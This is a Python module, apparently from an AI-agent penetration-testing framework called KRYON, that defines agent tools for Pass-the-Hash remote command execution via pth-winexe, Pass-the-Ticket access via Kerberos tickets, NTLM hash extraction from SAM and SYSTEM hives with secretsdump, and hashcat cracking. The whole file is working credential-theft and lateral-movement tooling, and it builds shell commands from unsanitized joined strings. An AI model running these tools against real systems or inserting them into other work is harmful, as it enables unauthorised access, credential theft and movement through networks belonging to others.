"""
KRYON Pass-the-Hash Attack Module
===================================

Implements Pass-the-Hash and Pass-the-Ticket attacks for Windows networks.
Uses Impacket-style tools for NTLM hash authentication.

Primary Users:
- AD Infiltrator: Active Directory lateral movement
- Pentest Agent (Alpha-Red): Network penetration
- Network Analyst (Alpha-Silver): Network reconnaissance
"""

import json
from typing import Any

from kryon.sdk.agents import function_tool
from kryon.tools.common import run_command

# Markers that mean the tool failed (its output is an error, not a result).
_FAIL_MARKERS = (
    "error",
    "failed",
    "denied",
    "not found",
    "no such",
    "traceback",
    "refused",
    "not installed",
    "command not found",
    "usage:",
)


def _exec(cmd_parts: list[str]) -> tuple[bool, str]:
    """Run cmd_parts and return (success, output).

    T4-C1: ``run_command`` returns a STRING and its 2nd positional is ``ctf`` (not
    args), so the old ``run_command(cmd_parts[0], " ".join(cmd_parts[1:]))`` ran only
    the bare binary and then did ``str.get(...)`` — an AttributeError swallowed by the
    except, so every call returned a fake failure. Join the whole command and interpret
    the returned string.
    """
    out = run_command(" ".join(cmd_parts))
    low = (out or "").lower()
    ok = bool(out.strip()) and not any(m in low for m in _FAIL_MARKERS)
    return ok, out


@function_tool(strict_mode=False)
def pass_the_hash(
    target: str,
    username: str,
    ntlm_hash: str,
    domain: str = ".",
    command: str = "",
) -> str:
    """
    Perform Pass-the-Hash attack to authenticate to a remote Windows system
    using an NTLM hash instead of a plaintext password. Uses pth-winexe for
    remote command execution with hash-based authentication.

    This is a core lateral movement technique that allows movement between
    systems using harvested NTLM hashes without needing to crack them.

    Args:
        target: Target IP or hostname (e.g. 192.168.1.100)
        username: Username to authenticate as (e.g. Administrator)
        ntlm_hash: NTLM hash in LM:NT format
                    (e.g. aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0)
        domain: Domain name (defaults to "." for local authentication)
        command: Command to execute on the remote system (defaults to cmd.exe)

    Returns:
        str: JSON with success status, authentication result, and command output

    Examples:
        pass_the_hash(
            target="192.168.1.100",
            username="Administrator",
            ntlm_hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        )
        pass_the_hash(
            target="dc01.corp.local",
            username="svc_sql",
            ntlm_hash="aad3b435b51404eeaad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d",
            domain="CORP",
            command="whoami /all"
        )
    """
    result = {"success": False, "output": "", "authenticated": False, "error": None}

    try:
        # Build pth command using impacket
        cmd_parts = ["pth-winexe"]
        cmd_parts.append(f"-U {domain}/{username}%{ntlm_hash}")
        cmd_parts.append(f"//{target}")

        if command:
            cmd_parts.append(command)
        else:
            cmd_parts.append("cmd.exe")

        ok, out = _exec(cmd_parts)
        if ok:
            result["success"] = True
            result["authenticated"] = True
            result["output"] = out
        else:
            result["error"] = out.strip() or "PTH attack failed"

    except Exception as e:
        result["error"] = str(e)

    return json.dumps(result)


@function_tool(strict_mode=False)
def pass_the_ticket(
    target: str,
    ticket_file: str,
    service: str = "cifs",
) -> str:
    """
    Perform Pass-the-Ticket attack using a Kerberos ticket (.kirbi or .ccache)
    to authenticate to a remote service without needing the user's password.

    Sets the KRB5CCNAME environment variable to the ticket file and uses
    Kerberos authentication to access the target service. Commonly used after
    extracting tickets via Rubeus, Mimikatz, or impacket-ticketer.

    Args:
        target: Target system hostname or IP (e.g. dc01.corp.local)
        ticket_file: Path to ticket file (.kirbi or .ccache format)
        service: Service to access — one of: cifs, http, ldap, mssql
                 (defaults to "cifs" for file share access)

    Returns:
        str: JSON with success status, command output, and error details

    Examples:
        pass_the_ticket(
            target="dc01.corp.local",
            ticket_file="/tmp/admin.kirbi"
        )
        pass_the_ticket(
            target="sql01.corp.local",
            ticket_file="/tmp/krbtgt.ccache",
            service="mssql"
        )
    """
    result = {"success": False, "output": "", "error": None}

    try:
        # Set KRB5CCNAME environment variable
        import os

        os.environ["KRB5CCNAME"] = ticket_file

        # Use ticket to access service
        ok, out = _exec(["smbclient", "-k", f"//{target}/{service}"])
        if ok:
            result["success"] = True
            result["output"] = out
        else:
            result["error"] = out.strip() or "PTT attack failed"

    except Exception as e:
        result["error"] = str(e)

    return json.dumps(result)


@function_tool(strict_mode=False)
def extract_ntlm_hash(
    sam_file: str,
    system_file: str,
    output_file: str = "",
) -> str:
    """
    Extract NTLM hashes from SAM and SYSTEM registry hives using
    impacket-secretsdump. These hives can be obtained from a compromised
    Windows system via shadow copy, reg save, or similar techniques.

    Args:
        sam_file: Path to SAM hive file
        system_file: Path to SYSTEM hive file
        output_file: Optional output file path for extracted hashes

    Returns:
        str: JSON with success status and list of extracted hashes

    Examples:
        extract_ntlm_hash(sam_file="/tmp/SAM", system_file="/tmp/SYSTEM")
        extract_ntlm_hash(
            sam_file="/tmp/SAM",
            system_file="/tmp/SYSTEM",
            output_file="/tmp/hashes.txt"
        )
    """
    result: dict[str, Any] = {"success": False, "hashes": [], "error": None}

    try:
        # Use secretsdump from impacket
        cmd_parts = ["secretsdump.py", "-sam", sam_file, "-system", system_file, "LOCAL"]

        if output_file:
            cmd_parts.extend(["-outputfile", output_file])

        ok, out = _exec(cmd_parts)
        if ok:
            result["success"] = True
            # Parse hashes from output
            for line in out.split("\n"):
                if ":" in line and len(line.split(":")) >= 3:
                    result["hashes"].append(line.strip())
        else:
            result["error"] = out.strip() or "Hash extraction failed"

    except Exception as e:
        result["error"] = str(e)

    return json.dumps(result)


@function_tool(strict_mode=False)
def crack_ntlm_hash(
    ntlm_hash: str,
    wordlist: str,
    rules: str = "",
) -> str:
    """
    Attempt to crack an NTLM hash using hashcat with a wordlist attack.
    Uses hashcat mode 1000 (NTLM) for offline password recovery.

    Args:
        ntlm_hash: NTLM hash to crack (e.g. 31d6cfe0d16ae931b73c59d7e0c089c0)
        wordlist: Path to wordlist file (e.g. /usr/share/wordlists/rockyou.txt)
        rules: Optional path to rules file for password mangling

    Returns:
        str: JSON with cracking result including cracked password if successful

    Examples:
        crack_ntlm_hash(
            ntlm_hash="31d6cfe0d16ae931b73c59d7e0c089c0",
            wordlist="/usr/share/wordlists/rockyou.txt"
        )
        crack_ntlm_hash(
            ntlm_hash="e52cac67419a9a224a3b108f3fa6cb6d",
            wordlist="/usr/share/wordlists/rockyou.txt",
            rules="/usr/share/hashcat/rules/best64.rule"
        )
    """
    result: dict[str, Any] = {
        "success": False,
        "cracked": False,
        "password": None,
        "error": None,
    }

    try:
        # Try hashcat first
        cmd_parts = ["hashcat", "-m", "1000", "-a", "0", ntlm_hash, wordlist]

        if rules:
            cmd_parts.extend(["-r", rules])

        ok, out = _exec(cmd_parts)
        if ok:
            # Parse cracked password
            if ":" in out:
                for line in out.split("\n"):
                    if ntlm_hash.lower() in line.lower() and ":" in line:
                        password = line.split(":")[-1].strip()
                        result["cracked"] = True
                        result["password"] = password
                        break
            result["success"] = True
        else:
            result["error"] = out.strip() or "Hash cracking failed"

    except Exception as e:
        result["error"] = str(e)

    return json.dumps(result)
